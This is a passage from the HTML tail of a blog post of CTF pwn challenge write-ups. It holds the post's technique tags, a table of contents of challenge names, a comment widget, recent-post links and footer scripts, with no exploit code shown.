href="https://signormercurio.me/post/WDB2018Pwn/">https://signormercurio.me/post/WDB2018Pwn/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Mercury</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2020-05-04</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="" rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/fsb/">fsb</a><a class="link-muted mr-2" rel="tag" href="/tags/uaf/">uaf</a><a class="link-muted mr-2" rel="tag" href="/tags/double-free/">double-free</a><a class="link-muted mr-2" rel="tag" href="/tags/fastbin-attack/">fastbin-attack</a><a class="link-muted mr-2" rel="tag" href="/tags/unlink/">unlink</a><a class="link-muted mr-2" rel="tag" href="/tags/SSP/">SSP</a><a class="link-muted mr-2" rel="tag" href="/tags/ret2shellcode/">ret2shellcode</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/pAssWD/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">pAssWD 开发记录</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/PwnTemplate/"><span class="level-item">Pwn 脚本模板</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",
            appKey: "sw2sEPOl4haCAXKUFYiBFMrR",
            placeholder: "Leave comments here...",
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            visitor: true,
            highlight: true,
            
            
            
            
            
            requiredFields: ["nick","mail"],
        });</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#GUESS"><span class="level-left"><span class="level-item">1</span><span class="level-item">GUESS</span></span></a></li><li><a class="level is-mobile" href="#blind"><span class="level-left"><span class="level-item">2</span><span class="level-item">blind</span></span></a></li><li><a class="level is-mobile" href="#babyheap"><span class="level-left"><span class="level-item">3</span><span class="level-item">babyheap</span></span></a></li><li><a class="level is-mobile" href="#easyfmt"><span class="level-left"><span class="level-item">4</span><span class="level-item">easyfmt</span></span></a></li><li><a class="level is-mobile" href="#fgo"><span class="level-left"><span class="level-item">5</span><span class="level-item">fgo</span></span></a></li><li><a class="level is-mobile" href="#soEasy"><span class="level-left"><span class="level-item">6</span><span class="level-item">soEasy</span></span></a></li><li><a class="level is-mobile" href="#pesp"><span class="level-left"><span class="level-item">7</span><span class="level-item">pesp</span></span></a></li><li><a class="level is-mobile" href="#semifinal-pwn1"><span class="level-left"><span class="level-item">8</span><span class="level-item">semifinal_pwn1</span></span></a></li><li><a class="level is-mobile" href="#semifinal-pwn2"><span class="level-left"><span class="level-item">9</span><span class="level-item">semifinal_pwn2</span></span></a></li><li><a class="level is-mobile" href="#semifinal-pwn3"><span class="level-left"><span class="level-item">10</span><span class="level-item">semifinal_pwn3</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-29T15:26:26.000Z">2021-07-29</time></p><p class="title"><a href="/post/JsMisc/">Javascript 杂记</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-17T13:00:31.000Z">2021-07-17</time></p><p class="title"><a href="/post/Joplin/">Joplin 使用小记</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-21T03:36:12.000Z">2021-03-21</time></p><p class="title"><a href="/post/QuasarTest/">Quasar Testing 指南</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-27T09:05:55.000Z">2021-01-27</time></p><p class="title"><a href="/post/FastAPITortoise/">FastAPI + TortoiseORM 实现异步 DB 操作</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-10T08:34:22.000Z">2021-01-10</time></p><p class="title"><a href="/post/FastAPIAuth/">基于 FastAPI 实现 OAuth2 登录认证</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a><p class="is-size-7"><span>&copy; 2021 Mercury</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>